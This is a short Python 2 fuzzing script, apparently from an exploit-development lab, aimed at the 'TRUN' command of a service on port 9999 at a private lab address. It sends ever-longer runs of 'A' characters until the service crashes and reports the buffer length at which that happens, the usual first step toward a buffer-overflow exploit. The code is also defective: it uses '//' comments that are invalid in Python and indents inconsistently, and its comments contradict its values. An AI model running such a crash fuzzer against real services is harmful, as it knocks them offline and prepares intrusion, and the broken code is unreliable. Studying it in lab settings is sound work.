#!/usr/bin/python

 
# CONNECT TO SERVER
 

import sys, socket

from time import sleep

 

# set first argument given at CLI to 'target' variable

# create string of 50 A's 'x41'

buff = "A"  * 100

 

# loop through sending in a buffer with an increasing length by 50 A's

while True:

  # The "try - except" catches the programs error and takes our defined action

  try:

    # Make a connection to target system on TCP/21

        server = '10.0.2.149' //change

        sport = 9999 // change

 

        s = socket.socket()

        connect = s.connect((server, sport))

        print s.recv(1024)

        s.send(('TRUN /.:/'  + buff))

        print s.recv(1024)

        print s.recv(1024)

        s.close()

        sleep(1)

        buff= buff + "A"*100

 

 

 

 

  except: # If we fail to connect to the server, we assume its crashed and print the statement below

    print "[+] Crash occured with buffer length: "+str(len(buff))

    sys.exit()
